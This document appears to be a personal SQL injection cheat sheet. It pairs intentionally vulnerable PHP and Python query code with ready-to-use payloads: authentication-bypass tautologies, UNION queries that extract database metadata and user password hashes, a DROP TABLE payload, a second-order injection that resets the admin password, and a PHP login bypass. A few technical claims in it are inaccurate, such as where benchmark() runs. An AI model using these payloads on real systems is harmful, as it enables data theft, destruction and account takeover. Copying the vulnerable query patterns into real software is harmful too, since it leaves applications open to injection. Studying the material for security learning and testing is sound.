# SQLi

Can be used when improper input sanitization exsists

- User input is not correctly filtered for string literal or escape characters
- User input is not having the correct type.

---

Example of a SQL statement (not recommended methods!!!):
php:
```php
$sql = "SELECT * FROM users WHERE id = $id"
```
python:
```python
cmd = "update users set name = '%s' where id = '%s'" (name, id)
```

---

comment
```sql 
-- = comment
```
Can seperate commands with
```sql
;
```

First attemt to try (show everything in the table):
```sql
'or '1'='1
```
or (% is wildcard):
```sql
%'or '1'='1
```
Check for True:
```sql
1 = 1
```
Check for False:
```sql
1 = 2
```
Get username for the table:
```sql
%' or 0 = 0 union select null, user() --
```
Database name:
```sql
%’ or 0 = 0 union select null, database() --
```
Database version:
```sql
%’ or 0 = 0 union select null, version() --
```
Table names and column names:
```sql
%' union select table_name, column_name from information_schema.columns where table_schema = '<DATABASE_NAME>' --
```
Table names:
```sql
%' and 1=0 union select null, table_name from information_schema
```
username and password hash from users table:
```sql
%' UNION SELECT user, password from users 
```

Modify:
```sql
insert
update
```

## Blind SQLi
Time:
Can use time to figure out what is going on:
```sql
benchmark(count,expr)
```
Banchmark do the expr as many time as the count size. Benchmark is performed on the client end not on the server end. Example:
```sql
benchmark(10,MD5('This is a test'))
```
Use the MD5:
```sql
SELECT MD5('Test_string')
```
Example; drop table:
```sql
a';DROP TABLE users; SELECT * FROM data WHERE 't' = 't
```

## Second order SQLi
Insert something that can be used later
Insert a new user and then update the password.
```sql
alice '' OR username = ''admin

UPDATE users set password = 'newpass' WHERE username = 'alice' OR username = 'admin'
```

## SQLi with PHP

mysql_real_escape_string() can be circumvented with using no ' in the queries. The variables in PHP cannot have quotes before and after it, to get this to work.

unhex() can be used to convert characters
```php
unhex(23) = #
unhex(27) = '
unhex(28) = (
unhex(29) = )
unhex(2a) = *
```

One example on bypassing a password field in php:
```php
<?php
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $query = "SELECT uid FROM users WHERE name = '$user' AND pass = MD5('$pass')";
?>
```
```sql
' OR 1 OR '' = '
```
Becomes:
```sql
SELECT uid from users WHERE name = '' OR 1 OR '' = '' AND pass = MD5('pass')
```
This would make you the first user in the table. Most likly the admin.

# Definition:
In-band SQLi
- Using the same channel to send a SLQi and recive the result
- Usualy Error based or Union based

Inferential SQLi (Blind)
- No result in browser
- Two types:
    - Boolean-based
    - Time-based

Out-of-band SQLi
- Features need to be enabled in the database
- Attacke cannot send and recive using the same channel.